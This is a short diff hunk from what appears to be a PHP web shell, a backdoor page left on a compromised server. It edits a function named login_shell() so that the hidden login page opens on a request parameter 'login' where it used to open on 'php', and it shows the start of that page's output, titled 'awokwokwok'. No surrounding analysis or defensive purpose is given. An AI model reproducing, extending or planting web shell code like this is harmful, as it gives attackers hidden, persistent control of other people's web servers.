@@ -25,7 +25,7 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 function login_shell() {
 ?>
 <?php
-if(isset($_REQUEST['php'])){
+if(isset($_REQUEST['login'])){
 	    echo "<title>awokwokwok</title>";
 	    echo "<br>";
         echo "<pre>";
